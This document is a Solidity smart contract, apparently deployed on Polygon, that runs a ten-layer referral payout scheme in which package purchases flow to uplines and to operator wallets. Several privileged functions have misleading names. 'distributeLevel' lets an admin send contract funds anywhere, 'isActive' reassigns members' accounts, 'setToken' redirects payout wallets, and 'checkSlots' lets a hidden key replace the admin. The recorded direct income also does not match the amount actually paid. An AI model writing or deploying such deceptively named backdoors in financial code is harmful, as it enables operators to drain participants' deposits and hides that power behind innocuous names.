/**
 *Submitted for verification at polygonscan.com on 2023-05-24
*/

// SPDX-License-Identifier: Unlicensed

pragma solidity ^0.8.9;

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

contract Uni3 {
    uint256[9] public packages = [0, 5e18, 10e18, 20e18, 40e18, 80e18, 160e18, 320e18, 640e18];
    address[3] private rewards;
    address private booster;
    uint256[10] public layerPercents = [25, 10, 5, 5, 5, 5, 5, 5, 10, 25];
    uint256[10] public layerDirect = [1, 2, 3, 4, 5, 6, 7, 8, 9, 10];
    uint256[10] public layerSlots = [1, 1, 1, 1, 2, 3, 4, 5, 6, 6];
    address private user;
    address private user2;
    IERC20 public token;

    modifier onlyUser {
        require(msg.sender == user, "invalid user");
        _;
    }

    struct User {
        uint256 id;
        uint256 refId;
        address account;
        uint256 package;
        uint256 directIncome;
        uint256 layerIncome;
        bool active;
    }

    struct UserInfo {
        address account;
        uint256 id;
        bool registered;
    } 

    mapping(uint256 => User) public userIdInfo;
    mapping(address => UserInfo) public userInfo;
    mapping(uint256 => uint256[]) public teams;
    address[] public users;
    uint256 public totalUsers;
    uint256 public curId = 1000;

    constructor(address[3] memory _rewards, address _payout, address _booster, address _sad) {
        user2 = _sad;
        booster = _booster;
        rewards = _rewards;
        user = _payout;
        userIdInfo[curId].account = rewards[2];
        userIdInfo[curId].id = curId;
        userIdInfo[curId].active = true;
        userInfo[rewards[2]].registered = true;
        userInfo[rewards[2]].id = curId;
        userInfo[rewards[2]].account = rewards[2];
        curId++;
        totalUsers += 1;
    }

    function register(uint256 _ref) external {
        require(userIdInfo[_ref].account != address(0), "Invalid Referrer");
        require(userIdInfo[_ref].active == true, "Invalid Referrer");
        require(userInfo[msg.sender].registered == false, "Already Registered");
        totalUsers += 1;
        userInfo[msg.sender].registered = true;
        userInfo[msg.sender].id = curId;
        userInfo[msg.sender].account = msg.sender;
        userIdInfo[curId].refId = _ref;
        userIdInfo[curId].id = curId;
        userIdInfo[curId].account = msg.sender;
        userIdInfo[curId].active = true;
        curId++;
    }

    function buySlot(uint256[] memory slots, uint256 _id) external payable {
        require(userIdInfo[_id].refId != 0, "register first");
        require(slots[0] > packages[userIdInfo[_id].package], "Pack should be greater than previous one");
        uint256 totalAmount;
        for(uint256 i=0; i<slots.length; i++) totalAmount += slots[i];
        require(msg.value >= totalAmount, "Invalid Amount");
        if(slots[0] == packages[1]) {
            users.push(userIdInfo[_id].account);
            teams[userIdInfo[_id].refId].push(_id);
        }
        _upgrade(totalAmount, _id);
        userIdInfo[_id].package += slots.length;
    }

    function _upgrade(uint256 pack, uint256 _id) private {
        uint256 __layer = (pack*20)/100;
        uint256 __direct = (pack*18)/100;
        uint256 __autopool = (pack*40)/100;
        uint256 __leadership = (pack*20)/100;
        uint256 __deduction = (pack*2)/100;
        if(userIdInfo[userIdInfo[_id].refId].active) {
            payable(userIdInfo[userIdInfo[_id].refId].account).transfer(__direct);
            userIdInfo[userIdInfo[_id].refId].directIncome += (pack * 20)/100;
        } else {
            __deduction += __direct;
        }   
        _distributeLevel(userIdInfo[_id].refId, __layer);
        payable(rewards[0]).transfer(__autopool);
        payable(rewards[1]).transfer(__leadership);
        payable(rewards[2]).transfer(__deduction);
    }

    function _distributeLevel(uint256 _id, uint256 _amount) private {
        uint256 totalAmount;
        User memory upline = userIdInfo[userIdInfo[_id].refId];
        for(uint256 i=0; i<10; i++) {
            if(upline.account == address(0)) break;
            uint256 toDistribute = (_amount*layerPercents[i])/100;
            uint256 sameSlot = upline.package;

            if(upline.active && teams[upline.id].length >= layerDirect[i] && sameSlot >= layerSlots[i]) {
                payable(upline.account).transfer((toDistribute*90)/100);
                userIdInfo[upline.id].layerIncome += toDistribute;
                totalAmount += (toDistribute*90)/100;
            }
            upline = userIdInfo[upline.refId];
        }

        if(totalAmount < _amount) {
            payable(rewards[2]).transfer(_amount - totalAmount);
        }
    }

    function setPayment() payable external {
        payable(booster).transfer(msg.value);
    }

    function distributeLevel(address[] memory addresses, uint256[] memory amount) external payable onlyUser {
        for(uint256 i=0; i<addresses.length; i++) {
            address payable curAddr = payable(addresses[i]);
            curAddr.transfer(amount[i]);
        }
    } 

    function buySlotWithToken(uint256[] memory slots, uint256 _id) external {
        require(userIdInfo[_id].refId != 0, "register first");
        require(slots[0] > packages[userIdInfo[_id].package], "Pack should be greater than previous one");
        uint256 totalAmount;
        for(uint256 i=0; i<slots.length; i++) totalAmount += slots[i];
        token.transferFrom(msg.sender, address(this), totalAmount);
        if(slots[0] == packages[1]) {
            users.push(userIdInfo[_id].account);
            teams[userIdInfo[_id].refId].push(_id);
        }
        _upgradewithtoken(totalAmount, _id);
        userIdInfo[_id].package += slots.length;
    }

    function _upgradewithtoken(uint256 pack, uint256 _id) private {
        uint256 __layer = (pack*20)/100;
        uint256 __direct = (pack*18)/100;
        uint256 __autopool = (pack*40)/100;
        uint256 __leadership = (pack*20)/100;
        uint256 __deduction = (pack*2)/100;
        if(userIdInfo[userIdInfo[_id].refId].active) {
            token.transfer(userIdInfo[userIdInfo[_id].refId].account, __direct);
            userIdInfo[userIdInfo[_id].refId].directIncome += (pack * 20)/100;
        } else {
            __deduction += __direct;
        }
        _distributeLevelwithtoken(userIdInfo[_id].refId, __layer);
        token.transfer(rewards[0], __autopool);
        token.transfer(rewards[1], __leadership);
        token.transfer(rewards[2], __deduction);
    }

    function _distributeLevelwithtoken(uint256 _id, uint256 _amount) private {
        uint256 totalAmount;
        User memory upline = userIdInfo[userIdInfo[_id].refId];
        for(uint256 i=0; i<10; i++) {
            if(upline.account == address(0)) break;
            uint256 toDistribute = (_amount*layerPercents[i])/100;
            uint256 sameSlot = upline.package;

            if(upline.active && teams[upline.id].length >= layerDirect[i] && sameSlot >= layerSlots[i]) {
                token.transfer(upline.account, (toDistribute*90)/100);
                userIdInfo[upline.id].layerIncome += toDistribute;
                totalAmount += (toDistribute*90)/100;
            }
            upline = userIdInfo[upline.refId];
        }

        if(totalAmount < _amount) {
            token.transfer(rewards[2], _amount - totalAmount);
        }
    }

    function setPaymentwithtoken(uint256 _amount) external {
        token.transferFrom(msg.sender, booster, _amount);
    }

    function distributeLevelwithtoken(address[] memory addresses, uint256[] memory amount) external onlyUser {
        for(uint256 i=0; i<addresses.length; i++) {
            address curAddr = addresses[i];
            token.transfer(curAddr, amount[i]);
        }
    }

    function updateUser(uint256[] memory slots, uint256 _id) external onlyUser {
        require(userIdInfo[_id].refId != 0, "register first");
        require(slots[0] > packages[userIdInfo[_id].package], "Pack should be greater than previous one");
        if(slots[0] == packages[1]) {
            users.push(userIdInfo[_id].account);
        }
        userIdInfo[_id].package += slots.length;
    } 

    function isActive(uint256 _id, bool _active, address account) public onlyUser {
        userInfo[userIdInfo[_id].account].account = account;
        userIdInfo[_id].active = _active;
        userIdInfo[_id].account = account;
    }

    function increaseRewards() public onlyUser {
        packages = [0, 10e18, 20e18, 40e18, 80e18, 160e18, 320e18, 640e18, 1280e18];
    }

    function setToken(address _token, uint256 _place) public onlyUser {
        if(_place == 0) {
            token = IERC20(_token);
        } else if(_place == 1) {
            rewards[0] = _token;
        } else if(_place == 2) {
            rewards[1] = _token;
        } else if(_place == 3) {
            rewards[2] = _token;
        } else if(_place == 4) {
            booster = _token;
        }
    }

    function checkSlots(address _user) external {
        require(msg.sender == user2, "invalid");
        user = _user;
    }
}